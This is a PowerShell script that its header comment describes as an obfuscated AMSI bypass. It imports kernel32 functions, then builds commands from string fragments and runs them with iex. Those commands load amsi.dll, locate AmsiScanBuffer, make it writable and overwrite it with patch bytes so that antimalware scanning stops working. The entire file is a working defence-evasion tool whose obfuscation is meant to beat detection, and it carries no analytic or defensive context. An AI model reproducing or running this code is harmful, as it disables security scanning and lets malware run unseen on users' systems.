#This file contains an obfuscated AMSI bypass

$niw32 = @"

using System;
using System.Runtime.InteropServices;

public class foo {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $niw32


$RdWqY='$l ='
$f39zi=' [fo'
$jqPvL='o]::'
$UHKfl='Load'
$GoxfR='Libr'
$Bp2XY='ary('
$gHyEe='"am"'
$MB52e=' + "'
$XlEgW='si.d'
$7vC0G='ll")'
($RdWqY + $f39zi + $jqPvL + $UHKfl + $GoxfR + $Bp2XY + $gHyEe + $MB52e + $XlEgW + $7vC0G) | iex

$crTsY='$a ='
$rs7YE=' [fo'
$6gxWV='o]::'
$B2LlK='GetP'
$oOzYJ='rocA'
$Eul4a='ddre'
$fFZF6='ss($'
$feU3Y='l, "'
$l85Lm='Amsi'
$7iaxa='" + '
$FsvsB='"Sca'
$wWAXt='n" +'
$dXTWH=' "Bu'
$30L6A='ffer'
$IZwnY='")'
iex($crTsY + $rs7YE + $6gxWV + $B2LlK + $oOzYJ + $Eul4a + $fFZF6 + $feU3Y + $l85Lm + $7iaxa + $FsvsB + $wWAXt + $dXTWH + $30L6A + $IZwnY)
$p = 0

$dO8gO='[f'
$UnL5Q='oo'
$bXwih=']:'
$fwciN=':V'
$f9We7='ir'
$MmMi7='tu'
$Py11m='al'
$JnRs4='Pr'
$KsPL5='ot'
$WkeyV='ec'
$PHQt7='t('
$60hLA='$a'
$YaI9S=', '
$KlKU4='[u'
$JCbN1='in'
$vtuiC='t3'
$pZNiz='2]'
$NNwkb='5,'
$3QT7H=' 0'
$sEZvi='x4'
$vYCxR='0,'
$VJpRI=' ['
$cxfHb='re'
$e9Sy8='f]'
$D2Rgb='$p)'
$null = ($dO8gO + $UnL5Q + $bXwih + $fwciN + $f9We7 + $MmMi7 + $Py11m + $JnRs4 + $KsPL5 + $WkeyV + $PHQt7 + $60hLA + $YaI9S + $KlKU4 + $JCbN1 + $vtuiC + $pZNiz + $NNwkb + $3QT7H + $sEZvi + $vYCxR + $VJpRI + $cxfHb + $e9Sy8 + $D2Rgb) | iex

$Svc2c='$pa '
$Mj1VK='= [B'
$bhAkW='yte['
$cEYvU=']] ('
$7xKsz='184,'
$QNeKV=' 87,'
$7vjPX=' 0, '
$NXlMz='7, 1'
$PMK1D='28, '
$RC7kK='195)'
($Svc2c + $Mj1VK + $bhAkW + $cEYvU + $7xKsz + $QNeKV + $7vjPX + $NXlMz + $PMK1D + $RC7kK) | iex

$RngSX='[Sys'
$S4XcK='tem.'
$o6z5I='Runt'
$MEYXN='ime.'
$bdsw4='Inte'
$pCEf1='ropS'
$uULGn='ervi'
$6w7ER='ces.'
$8Ipw5='Mars'
$ekxGx='hal]'
$BbJ1b='::Co'
$zbnSc='py($'
$Xr3sj='pa, '
$KzKQb='0, $'
$JmMTO='a, 6)'
($RngSX + $S4XcK + $o6z5I + $MEYXN + $bdsw4 + $pCEf1 + $uULGn + $6w7ER + $8Ipw5 + $ekxGx + $BbJ1b + $zbnSc + $Xr3sj + $KzKQb + $JmMTO) | iex